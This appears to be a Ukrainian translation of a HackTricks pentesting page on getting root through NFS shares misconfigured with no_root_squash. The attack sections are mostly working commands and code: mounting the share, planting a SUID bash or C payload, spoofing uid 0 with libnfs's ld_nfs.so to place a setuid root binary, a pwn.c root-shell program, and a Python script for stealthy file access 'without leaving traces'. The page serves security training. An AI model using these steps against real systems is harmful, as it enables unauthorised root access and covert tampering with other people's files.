# Підвищення привілеїв через неправильну конфігурацію NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація про Squashing

NFS зазвичай (особливо в linux) довіряє вказаним клієнтом `uid` і `gid` для доступу до файлів (якщо не використовується kerberos). Однак на сервері можна налаштувати деякі параметри, щоб **змінити цю поведінку**:

- **`all_squash`**: Squashing застосовується до всіх доступів, відображаючи кожного користувача та групу на **`nobody`** (65534 unsigned / -2 signed). Отже, усі є `nobody`, і жодні користувачі не використовуються.
- **`root_squash`/`no_all_squash`**: Це стандартна конфігурація в Linux, яка **застосовує squash лише до доступу з uid 0 (root)**. Отже, будь-які `UID` і `GID` довірені, але `0` перетворюється на `nobody` (тому impersonation root неможливий).
- **``no_root_squash`**: Якщо цю конфігурацію увімкнено, squash не застосовується навіть до користувача root. Це означає, що якщо змонтувати каталог із такою конфігурацією, можна отримати до нього доступ як root.

У файлі **/etc/exports**, якщо знайдено каталог, налаштований як **no_root_squash**, до нього можна **отримати доступ** із **клієнта** та **записувати всередині** цього каталогу так, ніби ви є локальним **root** цієї машини.

Для отримання додаткової інформації про **NFS** дивіться:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Підвищення привілеїв

### Remote Exploit

Варіант 1 із використанням bash:
- **Змонтувати цей каталог** на клієнтській машині та, будучи **root**, скопіювати всередину змонтованої папки бінарний файл **/bin/bash**, надати йому права **SUID** і **виконати з машини жертви** цей бінарний файл bash.
- Зверніть увагу, що для отримання root усередині NFS share на сервері має бути налаштовано **`no_root_squash`**.
- Однак, якщо цю опцію не увімкнено, можна підвищити привілеї до іншого користувача, скопіювавши бінарний файл у NFS share і надавши йому дозвіл SUID від імені користувача, до якого потрібно підвищити привілеї.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 із використанням скомпільованого коду C:
- **Монтування цього каталогу** на клієнтській машині та **копіювання від root** у змонтовану папку нашого скомпільованого payload, який зловживає дозволом SUID, надання йому прав **SUID** і **виконання з машини жертви** цього бінарного файлу (тут можна знайти деякі [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Ті самі обмеження, що й раніше
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини жертви, ви все одно можете використати Remote version для експлуатації цього privilege escalation, прокинувши необхідні порти**.\
> Наступний трюк потрібен у випадку, якщо файл `/etc/exports` **вказує IP-адресу**. У такому випадку ви **за жодних умов не зможете використати** **remote exploit** і вам потрібно буде **зловживати цим трюком**.\
> Ще одна необхідна умова для роботи exploit полягає в тому, що **export у `/etc/export`** **має використовувати прапорець `insecure`**.\
> --_Я не впевнений, що цей трюк спрацює, якщо `/etc/export` вказує IP-адресу_--

### Basic Information

Сценарій передбачає експлуатацію змонтованої NFS share на локальній машині з використанням недоліку в специфікації NFSv3, який дозволяє клієнту вказувати власні uid/gid і потенційно отримувати несанкціонований доступ. Exploitation передбачає використання [libnfs](https://github.com/sahlberg/libnfs) — бібліотеки, яка дозволяє підробляти NFS RPC calls.

#### Compiling the Library

Кроки компіляції бібліотеки можуть потребувати коригувань залежно від версії kernel. У цьому конкретному випадку syscalls fallocate було закоментовано. Процес компіляції передбачає використання таких команд:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Виконання Exploit

Exploit передбачає створення простої програми на C (`pwn.c`), яка підвищує привілеї до root, а потім запускає shell. Програму компілюють, а отриманий бінарний файл (`a.out`) розміщують на share із suid root, використовуючи `ld_nfs.so` для підробки uid у RPC-викликах:

1. **Скомпілювати код exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Розмістіть exploit на share та змініть його дозволи, підробивши uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Виконайте exploit, щоб отримати привілеї root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell для прихованого доступу до файлів

Після отримання root access для взаємодії з NFS share без зміни власника (щоб не залишати слідів) використовується Python-скрипт (nfsh.py). Цей скрипт налаштовує uid відповідно до uid файлу, до якого здійснюється доступ, що дає змогу взаємодіяти з файлами на share без проблем із дозволами:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Запустіть так:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
